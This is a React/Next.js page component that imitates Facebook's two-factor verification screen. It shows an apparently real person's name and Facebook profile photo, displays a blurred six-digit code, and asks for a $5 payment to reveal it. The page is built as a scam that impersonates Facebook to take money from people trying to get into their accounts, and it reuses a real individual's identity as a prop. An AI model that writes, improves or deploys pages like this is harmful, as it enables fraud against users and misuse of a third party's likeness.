'use client';

export default function SixDigit() {
    const code = '******';

    const fbUser = {
        name: 'Nur Alam',
        profilePic:
            'https://scontent.frjh7-1.fna.fbcdn.net/v/t39.30808-6/503361550_706415692325595_1281669552417602155_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeERBpcuzoKwzKChFzBmXEnKtToS8vty-ju1OhLy-3L6O9GtQjXWTaLoGLC3MznjLSfZG6miz8t5t0DqXFpmDTFf&_nc_ohc=B5ndg-8VbFYQ7kNvwHPcGmp&_nc_oc=Adkzqk61TNzhOI32P59woUd-xn2_OCYJimiHqd_tyhRwMiPMaUmBRDS8v8RamVh6eRrqJ9fzjsFgHWbmW0rgkpuG&_nc_zt=23&_nc_ht=scontent.frjh7-1.fna&_nc_gid=rYKGZwIZeK7V_4JEhktVdQ&oh=00_AfPN3Ww_ijCdHzd_C60maIPcI9bD7Y4DuQo5Jw2tzS1Xow&oe=6859A7CC',
    };

    return (
        <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4 py-10 font-sans">
            <div className="max-w-md w-full">
                <div className="flex items-center gap-4 mb-6">
                    <img
                        src={fbUser.profilePic}
                        alt="Profile"
                        className="w-16 h-16 rounded-full border-4 border-[#1877f2] object-cover"
                    />
                    <div>
                        <p className="text-sm text-gray-600">Facebook User</p>
                        <h2 className="text-xl font-semibold text-gray-900">{fbUser.name}</h2>
                    </div>
                </div>

                <h1 className="text-2xl font-semibold text-gray-900 mb-2">
                    Unlock Your Verification Code
                </h1>
                <p className="text-gray-700 text-sm mb-6">
                    A $5 payment is required to access your secure 6-digit verification code.
                </p>

                <div className="mb-6">
                    <img
                        className="rounded-md w-full"
                        src="https://web.facebook.com/images/assets_DO_NOT_HARDCODE/fb_company_illo/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png"
                        alt="2FA Illustration"
                    />
                </div>

                <div className="flex justify-between gap-2 mb-6">
                    {code.split('').map((digit, idx) => (
                        <div
                            key={idx}
                            className="w-12 h-14 border border-gray-300 rounded-lg flex items-center justify-center text-2xl font-semibold tracking-wider text-[#155fca]"
                        >
                            <span className="blur-sm select-none">{digit}</span>
                        </div>
                    ))}
                </div>

                <button className="w-full bg-[#1877f2] text-white font-medium py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition">
                    Pay $5 to Reveal 6-Digit Code
                </button>


            </div>
        </div>
    );
}
